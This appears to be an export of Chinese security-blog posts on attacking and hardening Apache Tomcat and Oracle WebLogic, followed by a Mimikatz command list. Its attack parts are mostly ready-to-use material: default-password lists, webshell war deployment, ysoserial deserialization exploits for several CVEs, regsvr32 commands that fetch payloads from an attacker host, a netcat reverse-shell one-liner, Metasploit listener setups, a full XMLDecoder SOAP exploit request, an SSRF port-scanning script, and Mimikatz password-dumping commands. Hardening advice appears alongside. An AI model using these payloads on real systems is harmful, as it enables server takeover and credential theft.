admin:password1admin:adminadmin:123456 admin:a123456admin:12345678admin:j5Brn9 admin:tomcattomcat:tomcat tomcat:s3cret tomcat:password1 tomcat:passwordtomcat:admintomcat:changethisboth:tomcat manager:manager role1:role1 role1:tomcat role:changethis root:Password1root:changethis root:password root:password1root:r00t root:toor root:rootadmin:tomcat: 3. war包部署webshell​ 在 tomcat 的 manager 中控制台自带的自动 war 包部署功能来部署我们的 webshell 把当前目录下的xiaoma.jsp文件打包成xiaoma.war 1234567jar -cvfM0 xiaoma.war xiaoma.jsp-c 创建war包-v 显示过程信息-f-M-0 这个是阿拉伯数字，只打包不压缩的意思 防御： 直接删掉 manager 目录 加强web口令 安全设备 [Java类WebServer及中间件拿webshell方法总结] 具体参见：https://www.cnblogs.com/shellr00t/p/5965727.html 4. Tomacat 远程代码执行[CVE-2016-8735 ]mark：http://www.freebuf.com/news/121868.html 前提是要启用JmxRemoteLifecycleListener包，默认情况下是不启用的漏洞原理：影响范围 Apache Tomcat 9.0.0.M1 to 9.0.0.M11 Apache Tomcat 8.5.0 to 8.5.6 Apache Tomcat 8.0.0.RC1 to 8.0.38 Apache Tomcat 7.0.0 to 7.0.72 Apache Tomcat 6.0.0 to 6.0.47 在 Tomcat 中默认会使用 JmxRemoteLifecycleListener 这个监听器来监控 tomcat 平时的各种运行状态,但 Oracle 在修复了 JmxRemoteLifecycleListener 反序列化漏洞[CVE-2016-3427] 之后,却忘记了及时对 Tomcat中的 jmx 监听器进行升级,这才导致了该漏洞的产生,所以,它本质还是 jmx 的漏洞并非 tomcat 自身漏洞,实际上 JmxRemoteLifecycleListener 平时用来做监控居多,没错,实战中直接从外部碰到该端口的机会也并不是特别多。 漏洞利用:首先,依然是先准备好基础环境,配置 JmxRemoteLifecycleListener 监听器,注意,如果你发现自己 tomcat 的lib 目录中没有 catalina-jmx-remote.jar 这个包,请自行到官方站点下载好放进去,不然可能会出报错,不过一般默认都会有,而后编辑 C:\\apache-tomcat-8.0.36\\conf\\server.xml 添加如下的监听器 1&lt;Listener className=&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot; rmiRegistryPortPlatform=&quot;10001&quot; rmiServerPortPlatform=&quot;10002&quot; /&gt; 端口可随意,只要不冲突即可 之后,再去编辑 C:\\apache-tomcat-8.0.36\\bin\\catalina.bat 文件,添加如下变量,直接在 setlocal 下面开始添加,语句的主要作用是方便别人远程连过来对此 jvm 进行监控,注意,此处是没有启用用户认证 最后,执行 C:\\apache-tomcat-8.0.36\\bin\\startup.bat 脚本,启动 tomcat,看到 rmi 的端口全部正常起来以后,说明环境基本就没啥问题了 扫描： 1nmap -n -sT -sV -p 1-50000 --open -Pn -v [目标ip] 反序列化 payload： ysoserial java 反序列化 payload 工具去执行系统命令: 1java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit [目标ip] 1000 1 Groovy1 \"cmd.exe /c net user flag \"Admin!@#45\" /add\" msf ： 很显然,在实战中,如果直接像上面这样执行系统命令利用起来肯定不够直接,我们现在不妨尝试直接配合 msf 一起利用,来尝试弹回一个 meterpreter 的 shell,具体过程如下 12345msf5 &gt; use exploit/multi/script/web_deliverymsf5 &gt; set target 3 # regsvr32 来远程下载执行msf5 &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf5 &gt; set lhost [本地ip]msf5 &gt; set lport 53msf5 &gt; set rc4password klionsec msf5 &gt; exploit -j 123唯一需要注意的是,由于执行过程中需要远程下载 payload,所以这就要求当前目标机器必须能正常通外网才行,不然 payload 都下不了,meterpreter 自然也就弹不回来了# java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.3.188 10001 Groovy1 &quot;cmd.exe /c regsvr32 /s /n /u /i:http://192 .168.3.7:8080/CzVtq564v1ymsYr.sct scrobj.dll&quot; powershell 回弹beacon： 如果你觉得 meterpreter 还不够直接,没问题,直接尝试利用 powershell 尝试弹个 beacon 的 shell 也是可以的,实际利用过程如下,先生成 ps 的 payload 而后,继续通过 ysoserial.jar 发送执行该 payload 1java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit [目标ip] 10001 Groovy1 \" cmd.exe /c powershell.exe -nop -w hidden -encodedcommand base64encode\" 5. Tomcat 7.0.0.x put 方法的利用 [CVE-2017-12615]mark: https://paper.seebug.org/398/ 前提是启动PUT方法、默认关闭。​ 在配置文件conf/web.xml 文件。默认 readonly 为 true，当 readonly 设置为 false 时，可以通过 PUT / DELETE 进行文件操控。 用 msf 生成 jsp webshell 1msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=[目标IP] LPORT=80 -f raw -o rev.jsp 通过 curl 把我们上面的 webshell 用重定向的方式直接 put 到目标机器的 web 根目录下,需要注意的是,默认 Tomcat 的 Servlet 是在 conf/web.xml 中配置的,当后缀名为 .jsp 和 .jspx 的时候,就会丢给JspServlet 处理,所以,我们需要对后缀做些特殊的处理,比如,在 url 最后加个 / . 或者 %20 继续通过 curl 访问执行该 webshell,即可看到目标机器的 cmd shell 被成功弹回1curl -I http://[目标IP]:8080/Readmes.jsp 7. Tomcat 本地提权漏洞利用[CVE-2016-1240]mark：http://www.freebuf.com/vuls/115862.html Tomcat 8 &lt;= 8.0.36-2 Tomcat 7 &lt;= 7.0.70-2 Tomcat 6 &lt;= 6.0.45 + dfsg-1~deb8u1 受影响的系统包括的Debian，Ubuntu的，其他使用相应的deb包的系统也可能受到影响。 前提：Debian 或者 Ubuntu 的特定 tomcat deb 包[必须未升级],简单回顾: 原理：劫持服务端配置文件 核心就在于 Tomcat 服务在启动时 [关键代码如下] 会将 log 文件 catalina.out 的所有者改为 Tomcat 用户[降权行为],而启动脚本通常却是以 root 权限在执行,那么借助此特性,我们可以通过用创建软链接的方式,在root 重启 tomcat 服务时将任意文件的属主改为 Tomcat 账户,以达到降权访问系统核心配置文件的目的,比如,你事先在 tomcat 权限下将 catalina.out 修改为指向那些原本需要高权限才能访问到的关键性系统文件的软链接,此后 root 重启 tomat 便可以随意访问该系统配置文件,说到底这其实还是一种非常典型的配置文件加载劫持手法,更深入的就不说了,主要还是看在实战中如何利用,漏洞关键代码如下,就那一句 默认网站目录位置:/var/lib/tomcat7/webapps/ROOT 添加控制台角色用户,等会儿部署 webshell 要用 12345# vi /etc/tomcat7/tomcat-users.xml&lt;role rolename=&quot;manager-gui&quot;/&gt;&lt;role rolename=&quot;admin-gui&quot;/&gt;&lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;manager -gui,admin-gui&quot;/&gt;# /etc/init.d/tomcat7 restart 重启 tomcat 服务 下面,我们来着重看看具体利用过程,先尝试通过部署 war 包弹回一个低权限的 meterpreter 的 shell 用 msf 快速生成一个 war 包 webshell 123456msf5 &gt; use exploit/multi/handlermsf5 &gt; set payload java/meterpreter/reverse_https msf5 &gt; set lhost 192.168.3.7msf5 &gt; set lport 443msf5 &gt; set exitonsession false msf5 &gt; exploit -jmeterpreter &gt; getuidmeterpreter &gt; pwd 再通过默认 manager 管理控制台把自己 war 包 webshell 部署到目标机器上去 接着,本地启动 msf 执行监听,访问我们刚刚部署好的 war 包 webshell 的 url http://192.168.3.153:8080/options,随后便可看到 meterpreter 被正常弹回,注意,此时弹回的权限仍然比较低,只是个 tomcat 服务用户权限 而后,开始今天的重点,首先,找到 catalina.out 文件所在的路径,默认会在/var/log/tomcat7 目录下,实战中如果实在找不到,不妨直接 find 下,而后上传 exp 脚本并赋予执行权限 123456msf5 &gt; use exploit/multi/handlermsf5 &gt; set payload java/meterpreter/reverse_https msf5 &gt; set lhost 192.168.3.7msf5 &gt; set lport 443msf5 &gt; set exitonsession false msf5 &gt; exploit -jmeterpreter &gt; getuidmeterpreter &gt; pwd 跟上 catalina.out 日志文件所在路径,开始执行 exp 脚本,此时只待目标重启 tomcat 服务,我们便可获取一个 root 权限的 shell,其实,是因为在 tmp 目录下下会生成一个带有 suid 权限的 tomcatrootsh 文件 Ok,此处我们就自己用 root 到目标机器上重启下 tomcat 服务,看看实际提权效果,实战中,完全可以不用等,想办法直接把 tomcat 进程干掉,逼着管理员过来重启 tomcat 就行 当目标管理员重启 tomcat 服务后,我们便立即有了一个 root 权限的 shell。 6. Tomcat安全绕过漏洞[CVE-2018-1305]mark: http://www.nsfocus.com.cn/content/details_141_2703.html https://xz.aliyun.com/t/2088 受影响版本 Apache Tomcat &lt; 9.0.5Apache Tomcat &lt; 8.5.28Apache Tomcat &lt; 8.0.50Apache Tomcat &lt; 7.0.85 条件： 业务系统部署在低版本的Tomcat中。业务系统通过注解的方式定义安全约束。 漏洞危害较高，但是利用条件困难，因此影响范围并不大。 0x02 Tomcat服务安全加固Tomcat服务默认启用了管理后台功能，使用该后台可直接上传 war 文件包对站点进行部署和管理。由于运维人员的疏忽，可能导致管理后台存在空口令或者弱口令的漏洞，使得黑客或者不法分子可以利用该漏洞直接上传 Webshell 脚本导致服务器沦陷。 通常 Tomcat 后台管理的 URL 地址为 http://iP:8080/manager/html/, 黑客通过猜解到的口令登录 Tomcat 管理后台后，可以上传 Webshell 脚本导致服务器被入侵。 安全加固方案由于此类型漏洞可能对业务系统造成比较严重的危害，建议针对 Tomcat 管理后台进行以下安全加固配置。 1. 网络访问控制 如果的业务不需要使用 Tomcat 管理后台管理业务代码，建议使用安全组防火墙功能对管理后台 URL 地址进行拦截，或直接将 Tomcat 部署目录中 webapps 文件夹中的 manager、host-manager 文件夹全部删除，并注释 Tomcat 目录中 conf 文件夹中的 tomcat-users.xml 文件中的所有代码。 如果的业务系统确实需要使用 Tomcat 管理后台进行业务代码的发布和管理，建议为 Tomcat 管理后台配置强口令，并修改默认 admin 用户，且密码长度不低于10位，必须包含大写字母、特殊符号、数字组合。 2. 开启 Tomcat 的访问日志修改 conf/server.xml 文件，将下列代码取消注释： 1&lt;Valve className=\"org.apache.catalina.valves.AccessLogValve\" directory=\"logs\" prefix=\"localhost_access_log.\" suffix=\".txt\" pattern=\"common\" resolveHosts=\"false\"/&gt; 启用访问日志功能，重启 Tomcat 服务后，在 tomcat_home/logs 文件夹中就可以看到访问日志。 3.Tomcat 默认帐号安全修改 Tomcat 安装目录 conf 下的 tomcat-user.xml 文件，重新设置复杂口令并保存文件。重启 Tomcat 服务后，新口令即生效。 4.修改默认访问端口修改 conf/server.xml 文件把默认的 8080 访问端口改成其它端口。 5. 重定向错误页面修改访问 Tomcat 错误页面的返回信息，在 webapps\\manger 目录中创建相应的401.html、404.htm、500.htm 文件，然后在 conf/web.xml 文件的最后一行之前添加下列代码： 123456789101112&lt;error-page&gt; &lt;error-code&gt;401&lt;/error-code&gt; &lt;location&gt;/401.htm&lt;/location&gt; &lt;/error-page&gt; &lt;error-page&gt; &lt;error-code&gt;404&lt;/error-code&gt; &lt;location&gt;/404.htm&lt;/location&gt; &lt;/error-page&gt; &lt;error-page&gt; &lt;error-code&gt;500&lt;/error-code&gt; &lt;location&gt;/500.htm&lt;/location&gt; &lt;/error-page&gt; 6. 禁止列出目录防止直接访问目录时由于找不到默认页面，而列出目录下的文件的情况。 在 web.xml 文件中，将&lt;param-name&gt;listings&lt;/param-name&gt;改成&lt;param-name&gt;false&lt;/param-name&gt;。 7. 删除文档和示例程序删除 webapps 目录下的 docs、examples、manager、ROOT、host-manager 文件夹。","categories":[],"tags":[{"name":"Web应用安全","slug":"Web应用安全","permalink":"https://shackles.top/tags/Web应用安全/"}]},{"title":"Weblogic漏洞利用与安全加固","slug":"中间件安全-Weblogic漏洞利用与安全加固","date":"2018-01-13T15:53:56.000Z","updated":"2019-02-19T03:32:10.325Z","comments":true,"path":"2018/01/13/中间件安全-Weblogic漏洞利用与安全加固/","link":"","permalink":"https://shackles.top/2018/01/13/中间件安全-Weblogic漏洞利用与安全加固/","excerpt":"","text":"0x00 前言 WebLogic是美国bea公司出品的一个application server，确切的说是一个基于Javaee架构的中间件，纯java开发的，最新版本WebLogic Server 12cR2 (12.2.1.3)(截至发文前)是迄今为止发布的最卓越的BEA应用服务器。BEA WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。完全遵循J2EE 1.4规范。 安装：https://blog.csdn.net/acmman/article/details/70093877 0x01漏洞利用1、 默认管理控制台入口,端口扫描 + web 搜索引擎 + 空间搜索引擎 1nmap -sT -sV -Pn -v --open -p 80,7000-10000 192.168.3.195 考虑到精度,建议直接在目标 C 段跑,weblogic 默认端口为 7001,但通常情况下都会被目标管理员改掉,所以实战中端口最好稍微放大点 如何精确识别 weblogic 版本是否在漏洞范围内,其实在控制台入口页面的左下角就有详细显示 2、部署War包传Webshell1) 常见 weblogic 入口弱口令列表如下, 12345678910111213141516administrator:password weblogic:password weblogic:weblogic weblogic:weblogic1 weblogic:welcome1 weblogic:Oracle@123 system:weblogic system:password system:security system:system portaladmin:portaladminwlcsystem:wlcsystem wlpisystem:wlpisystem admin:securityjoe:passwordguest:guest 2) 当我们登录成功后,就可以立即尝试部署自己的 war 包 webshell 了,以下方法对于 weblogic 10.x - 12.x 版本几乎通用,具体如下 123456789101112131415首先,登到 weblogic 控制台中,点击&apos; 锁定并编辑&apos; -&gt; &apos; 部署&apos;选择 &apos;安装&apos;选中自己事先准备好的 war 包 webshell [ 依然还是用我们之前文章中的那个 war 包 ],选择第一项 &apos;将部署上载到管理服务器&apos;,然后点击下一步根据提示可以看到, 此时我们的 war 包已经上传成功了,就在如下的目录中,继续...给该部署命名,此处为了防止出问题,建议保持默认点击&apos; 完成&apos;后,会提示 &apos;设置更新成功&apos;此时再次回到&apos;部署&apos;选项中,选中刚刚部署的 cmd 应用程序,点击&apos;启动&apos;服务,注意,此处一定要来自己手工启动服务,不然 shell 是部署不上的选择&apos; 是&apos; 看到上面提示已启动部署,此时再用浏览器访问 http://[本地IP]:7001/cmd/cmd.jsp 就可以看到我们的 shell 了,如下 3、 Weblogic远程代码执行漏洞[CVE-2018-2893]http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html Weblogic 10.3.6.0 Weblogic 12.1.3.0 Weblogic 12.2.1.2 Weblogic 12.2.1.3 漏洞验证 1python cve-2018-2893-test.py [目标IP] 7001 12java -jar ysoserial-cve-2018-2893.jar JRMPClient4 &quot;[本地IP]:1099&quot; &gt; shell.cerjava -cp ysoserial-cve-2018-2893.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 &quot;mshta.exe [本地IP] /options.hta&quot; 1python weblogic.py [目标IP] 7001 shell.cer 在远程目标机器上执行该 payload 4、反序列化远程代码执行 [CVE-2018-2628]基本原理：由于 weblogic 对于 T3 协议发送的数据包没有过滤,注册一个 RMI 接口,通过 T3 协议建立连接,加载回来再一步步解包,利用 readObject 解析,从而造成了反序列化远程代码执行 影 响 版 本 : Weblogic 10.3.6.0Weblogic 12.1.3.0Weblogic 12.2.1.2Weblogic 12.2.1.3 漏洞验证 依然是先快速验证下目标是否存在此漏洞 [ 注意,目标如果用的是非默认的 7001 端口,则需要自行到脚本中去稍微改下 ]: 1234java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 ' regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll'#win 平台反弹 meterpreterjava -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.3.233 110 &gt;/tmp/f'#linux反弹bash 看到会话回来此处就可以立即 ctrl + c 了,很显然,既然可以弹 meterpreter,那也就一定可以弹 beacon。 1python CVE-2018-2628-exploit.py [目标IP] 7001 ysoserial.jar 192.168.3.14 1099 JRMPClient 123456msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14msf &gt; set lport 53msf &gt; set rc4password klionsec msf &gt; exploit –jmsf &gt; sessions -i 1meterpreter &gt; sysinfo meterpreter &gt; getuid 5、反序列化[CVE-2017-10271]漏洞基本原理：即 wls wsat 模块的 RCE,究其底层其实还是 XMLDecoder 的反序列化漏洞 poc：https://github.com/hanc00l/weblogic_wls_wsat_rce 1python weblogic_wls_wsat_exp.py -t 172.16.80.131:7001 poc： http://www.bugsafe.cn/archives/136.html 首先,快速验证目标是否存在此漏洞,浏览器访问 poc url : /wls-wsat/CoordinatorPortType 看到类似下面的返回则说明目标机器可能存在此漏洞http://[目标IP] /wls-wsat/CoordinatorPortType 而后,直接把下面的请求贴到 burpsuite 的 repeater 模块中进行请求,以此在目标机器上触发漏洞并执行我们的 payload,具体如下 1234567891011121314151617181920212223242526272829303132POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.3.195Accept-Encoding: identity Content-Length: 695Accept-Language: zh-CN,zh;q=0.8Accept: */*User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3Connection: keep-alive Cache-Control: max-age=0Content-Type: text/xmlsoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;&lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"&gt;&lt;java version=\"1.8.0_131\" class=\"java.beans.XMLDecoder\"&gt;&lt;void class=\"java.lang.ProcessBuilder\"&gt;&lt;array class=\"java.lang.String\" length=\"3\"&gt;&lt;void index=\"0\"&gt;&lt;string&gt;cmd.exe&lt;/string&gt; #于执行 payload 代码的命令解释器,如果是在 linux 中,此处通常应该为/bin/bash&lt;/void&gt;&lt;void index=\"1\"&gt;&lt;string&gt;/c&lt;/string&gt; #不交互,在 linux 下的选项写法为-c&lt;/void&gt;&lt;void index=\"2\"&gt;string&gt;regsvr32 /s /n /u /i:http://192.168.3.14:8080/PhgWw1pQB6uBg.sct scrobj.dll&lt;/string&gt; 实际要执行的 payload 代码,直接远程下载执行,linux 中可以用 wget 或者 curl,然后管道交给 bash 去执行&lt;/void&gt;&lt;/array&gt;&lt;void method=\"start\"/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 点击’go’ 之后便 meterpreter 已正常回连 12345msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14msf &gt; set lport 53msf &gt; set rc4password klionsec msf &gt; exploit -j msf模块 exploit/multi/http/oracle_weblogic_wsat_deserialization_rce 6、 反序列化[CVE-2017-3248] 影 响 版 本 : Weblogic 10.3.6.0Weblogic 12.1.3.0Weblogic 12.2.1.0Weblogic 12.2.1.1 指定目标目标 weblogic 的 ip 端口和 JRMP 监听器的 ip [实战中肯定会直接放到自己的 vps 上搞] 端口[回连下载自己 payload 用的] 1python exploit-CVE-2017-3248-bobsecq.py -t 192.168.3.195 -p 7001 --jip 192.168.3.14 --jport 1099 --cmd \"regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kizans5Oa7F.sct scrobj.dll\" --ysopath ysoserial.jar 上面执行完以后,脚本会提示你启动 JRMP 监听,此时另起一个终端执行该监听,而后再回到上面去继续敲回车执行我们的 payloadjava -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 ‘regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kiz ans5Oa7F.sct scrobj.dll’ 起监听,等待远程连接下载执行相应的 payload 最后,便会看到目标机器的 meterpreter 正常被弹回 1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 'regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kiz ans5Oa7F.sct scrobj.dll' 起监听,等待远程连接下载执行相应的 payload 12345msf &gt; use exploit/multi/script/web_delivery msf &gt; set target 3msf &gt; set payload windows/meterpreter/reverse_tcp_rc4_dns msf &gt; set lhost 192.168.3.14msf &gt; set lport 53msf &gt; set rc4password klionsecmsf &gt; exploit -j 7、 代码执行[CVE-2016-3510]poc: 1python weblogic-CVE-2016-3510.py 192.168.3.195:7001 \"regsvr32 /s /n /u /i:http://192.168.3.14:8080/y8kizans5Oa7F.sct scrobj.dll\" --ysoserial-path ysoserial.jar 8、 代码执行[CVE-2015-4852] 受影响版本:Oracle WebLogic Server, versions 10.3.6.0, 12.1.2.0, 12.1.3.0 and 12.2.1.0 直接利用 t3 协议反弹目标机器的 cmd shell python weblogic.py -u 192.168.3.11 -p 7001 -os win -t reverse_shell –LHOST 192.168.3.14 –LPORT 8081 nc -lvvp 8081 9、Weblogic ssrfWeblogic ssrf url 如下: 12http://192.168.3.195:7001/uddiexplorer/SearchPublicRegistries.jsppoc url: /uddiexplorer/SearchPublicRegistries.jsp?operator=http://localhost/robots.txt&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp; txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search 探测内网开放端口: 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python# coding: utf-8import argparseimport threadimport timeimport reimport requestsdef ite_ip(ip): for i in range(1, 256): final_ip = '&#123;ip&#125;.&#123;i&#125;'.format(ip=ip, i=i) print final_ip thread.start_new_thread(scan, (final_ip,)) time.sleep(3)def scan(final_ip): ports = ('6379','445','8080','3389','1433','1521','3306','80','443','7001','8000') for port in ports: vul_url = args.url+'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search' % (final_ip,port) try: #print vul_url r = requests.get(vul_url, timeout=15, verify=False) result1 = re.findall('weblogic.uddi.client.structures.exception.XML_SoapException',r.content) result2 = re.findall('but could not connect', r.content) result3 = re.findall('No route to host', r.content) if len(result1) != 0 and len(result2) == 0 and len(result3) == 0: print '[!]'+final_ip + ':' + port except Exception, e: passif __name__ == '__main__': parser = argparse.ArgumentParser(description='Weblogic SSRF vulnerable exploit') parser.add_argument('--url', dest='url', required=True, help='Target url') args = parser.parse_args() ip = \"192.168.4\" if ip: print ip ite_ip(ip) else: print \"no ip\" 0x02 安全加固1.1. 目的 本规范明确了Weblogic应用服务器安全配置方面的基本要求。为了提高Weblogic应用服务器的安全性而提出的。1.2. 范围 本规范适用于XXXX使用的Weblogic应用服务器。\\2. 强化Weblogic主机2.1. 强化操作系统网络服务【说明】在安装Weblogic前加固底层的操作系统。2.2. 使用可以防止非授权访问的文件系统【说明】确保Weblogic主机的文件系统可以防止非授权访问，例如Windows的NTFS。2.3. 限制Weblogic主机上的用户数量【说明】理想状况下，主机上的帐号应为2个管理员权限的帐号，1个运行Weblogic的帐号。2.4. 帐号和密码【说明】避免使用明显可以猜测到的帐号如”system”,”admin”或者”administrator”。口令至少8位，并满足复杂度要求。2.5. 访问Weblogic资源的帐号的唯一性【说明】在操作系统上建立一个专门用于Weblogic的帐号。【具体配置】该帐号只能操作以下三个目录：1)BEA主目录。该目录是BEA多个产品的共享目录。2)Weblogic安装目录。该目录包括了所有的安装程序。3)域目录。该目录包括了设置文件、安全文件、日志文件和J2EE应用等。赋予该帐号对以上三个目录读写执行权限。2.6. 使用特殊帐号Run Weblogic Server Windows服务【说明】在Windows平台，可以以Windows服务的方式运行Weblogic Server实例。这样会导致每次启动Windows自动执行Weblogic Server。而且不要以Windows administrator权限运行Weblogic Server。【具体配置】如何以一个特殊非管理员帐号运行Weblogic Server请参考以下： http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#Setting_Up_a_Weblogic_Server_as_a_Windows_Service 验证以一个特殊非管理员帐号运行Weblogic Server请参考以下： http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#VerifyUserAccountForWinService2.7. 不在生产机上开发【说明】在开发环境中开发相应的代码，经过测试后将代码转移到生产机上。此举是为了防止开发过程中的Bug影响生产环境。【具体配置】 验证DocumentRoot包括以下设置： Order allow,deny Allow from allOptions NoneAllowOverride None​2.8. 不在生产机上安装开发和sample软件【说明】将开发工具从生产机上移除可以防止该工具被入侵者利用，一定程度地访问生产系统。2.9. 启动安全审计【说明】如果Weblogic运行的操作系统支持对文件和目录访问的安全审计，建议使用日志跟踪对文件和目录的拒绝访问。【具体配置】使用ModSecurity Core Rules限制请求的方式： modsecurity_crs_30_http_policy.conf 文件包括以下的规则， # allow request methods # # TODO Most applications only use GET, HEAD, and POST request # methods, if so uncomment the line below. Otherwise you are advised # to edit the line before uncommenting it. # SecRule REQUEST_METHOD “!^((?:(?:POS|GE)T|OPTIONS|HEAD))$” \\“phase:1,log,auditlog,status:501,msg:’Method is not allowed by policy’, severity:’2’,,id:’960032’,”2.10. 应用最新的BEA补丁，考虑实施官方最新的安全建议【说明】如题【具体配置】注册BEA Advisories &amp; Notifications（http://dev2dev.bea.com/advisories）以便收到最新的安全建议信息。 从http://commerce.beasys.com/downloads.可以下载Service Pack\\3. 强化网络连接3.1. 使用防火墙或Weblogic Server connection filters【说明】建议使用防火墙限制Weblogic Server域外到域的连接；使用Connection Filters限制Weblogic Server域内的连接。更多信息可参考http://e-docs.bea.com/wls/docs70/secmanage/domain.html#connection_filter3.2. 使用管理端口来承载管理的流量 【说明】建议使用域范围内的管理端口 Administration Port来限制同一Weblogic Server域内的server instances间的流量都经过同一端口。当不使用管理端口时，管理流量会以明文形式在网上传输。管理端口另一个好处是当遭受到拒绝服务攻击时，仍然可以通过该端口管理Weblogic Server。 配合Connection Filters使用，可以指定Weblogic Server只接受来自某一IP段的管理请求，并所有连接只通过一个端口。 使用管理端口可以保证客户端与管理控制台以加密的方式连接。 更多信息可以参考http://e-docs.bea.com/wls/docs70/ConsoleHelp/domain.html#enabling3.3. 使用管理通道 【说明】建议启用管理通道Administration Channel以确保服务器间的管理流量的安全性。没有管理通道，一些关键的管理信息会以明文传输。更多的信息可以参考http://e-docs.bea.com/wls/docs70/admin_domain/network.html \\4. 强化Weblogic安全服务4.1. 部署符合生产环境的Security Provider【说明】Weblogic Security Service使用了一个可插拔的安全架构，在这个架构下可以部署多个secuirty provider。缺省条件下，Weblogic Server包括其自身的security providers,该provider已经提供了完整的安全解决方案。【具体配置】确保恰当地部署了security providers.可以通过以下位置验证： Administration Console under the Security → Realms → RealmName→Providers folder. 其它信息可以参考：http://e-docs.bea.com/wls/docs70/secmanage/realm.html4.2. 使用SSL【说明】为保证数据传输安全，建议使用SSL和HTTPS替代HTTP。Weblogic Server包括一系列的开发用的Private Keys，数字证书和truseted certificate authorities。每一个下载Weblogic Server的用户都拥有对这些证书的Private Keys。禁止使用展示用的identity &amp; trust.设置SSL可以参考http://e-docs.bea.com/wls/docs70/secmanage/ssl.html4.3. 使用主机名验证【说明】使用主机名验证以避免中间人攻击。缺省下，Weblogic SSL验证发起连接的主机是否经过授权，但实施SSL前主机名验证可能已经被禁止了。 【具体配置】确保使用了Hostname 可以通过以下位置设置： Administration Console on theServer s→ ServerName → Connections → SSLtab.4.4. 防止拒绝服务【说明】限制请求的大小和时间以防止拒绝服务攻击。Weblogic Server可以限制消息的大小和消息到达的最大时间。 可以通过以下位置设置：Administration Console on the Servers →ServerName →Connections → Protocols tab.4.5. 设置帐号锁定和登录时间【说明】限制请求的大小和时间以防止拒绝服务攻击。Weblogic Server可以限制消息的大小和消息到达的最大时间。 可以通过以下位置设置：Administration Console on the Security → Realms→ RealmName → User Lockouts tab.4.6. 开启安全审计【说明】如果开启了Weblogic Security Service提供的Auditing Provider，日志会存在以下位置：DomainName\\DefaultAuditRecorder.log 可以通过以下位置设置：Administration Console on the Security → Realms→ RealmName → Providers → Auditors page. 更多信息可以参考：http://e-docs.bea.com/wls/docs70/ConsoleHelp/security_7x.html#auditprovider4.7. 限制发送主机名和版本号【说明】缺省条件下，当Weblogic Server响应HTTP请求时，在其HTTP响应的包头中包括服务器的名称和Weblogic版本号，这会导致服务器信息的泄漏。 可以通过以下位置设置：  disable the Send Server Header Enabled attribute in the Administration Console. The attribute is located on the Server →ServerName → Connections → HTTP tab.4.8. 默认安全角色【说明】确保正确地将用户和组分配给默认的Weblogic Server Security roles. 缺省下，Weblogic是基于一系列的缺省安全角色和安全策略来保护资源。更多信息可以参考： http://e-docs.bea.com/wls/docs70/adminguide/secsysadm.html","categories":[],"tags":[{"name":"中间件安全","slug":"中间件安全","permalink":"https://shackles.top/tags/中间件安全/"}]},{"title":"Mimikatz","slug":"Mimikatz","date":"2018-01-13T15:53:56.000Z","updated":"2018-11-14T13:10:53.189Z","comments":true,"path":"2018/01/13/Mimikatz/","link":"","permalink":"https://shackles.top/2018/01/13/Mimikatz/","excerpt":"","text":"Mimikatz常见命令 cls—————————–清屏 exit—————————-退出 version————查看mimikatz的版本 system::user—–查看当前登录的系统用户 system::computer——-查看计算机名称 process::list——————列出进程 process::suspend 进程名称 —–暂停进程 process::stop 进程名称———结束进程 process::modules –列出系统的核心模块及所在位置 service::list—————列出系统的服务 service::remove———–移除系统的服务 service::start stop 服务名称–启动或停止服务 privilege::list—————列出权限列表 privilege::enable——–激活一个或多个权限 privilege::debug—————–提升权限 nogpo::cmd————打开系统的cmd.exe nogpo::regedit ———–打开系统的注册表 nogpo::taskmgr————-打开任务管理器 ts::sessions—————–显示当前的会话 ts::processes——显示进程和对应的pid情况等 sekurlsa::wdigest—–获取本地用户信息及密码 sekurlsa::tspkg——获取tspkg用户信息及密码 sekurlsa::logonPasswords–获登陆用户信息及密码 翻译来自：https://adsecurity.org/?page_id=1821 